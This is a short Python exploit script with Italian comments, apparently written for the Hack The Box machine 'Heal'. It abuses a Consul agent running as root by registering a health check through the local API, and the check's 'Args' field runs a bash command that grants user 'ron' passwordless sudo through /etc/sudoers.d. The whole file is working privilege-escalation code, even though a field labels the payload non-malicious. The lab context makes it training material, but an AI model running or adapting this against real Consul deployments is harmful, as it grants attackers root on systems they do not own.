import requests

# exploit per la privilege escalation per la macchina Heal HTB

# nella macchina gira Consul come root, questo è l'endpoint api 
# per fare un nuovo check
url='http://localhost:8500/v1/agent/check/register'

# nel json per il check c'è un parametro "Args" che permette di eseguire comandi
payload = {
  "ID": "alexshadow",
  "Name": "Exploit",
  "Notes": "payload non malevolo",
  "DeregisterCriticalServiceAfter": "90m",
  "Shell": "/bin/bash",
  # parametro che esegue comandi
  "Args": [ 
      "/bin/bash",
      "-c",
      "echo 'ron ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers.d/ron && chmod 0440 /etc/sudoers.d/ron"
  ],
  "Interval": "10s",
  "Timeout": "5s"
}

try:
    print("[+] avviamento exploit...")
    # invio della richiesta
    richiesta=requests.put(url=url,json=payload)
    # controlli del successo o del fallimento
    if richiesta.status_code==200:
        print(f"[+] codice risposta: {richiesta.status_code}")
        print("[+] exploit riuscito")
        print(richiesta.text)
    else:
        print(f"[!] codice risposta: {richiesta.status_code}")
        print("[!] exploit non riuscito")
        print(richiesta.text)
except:
    print("ERRORE")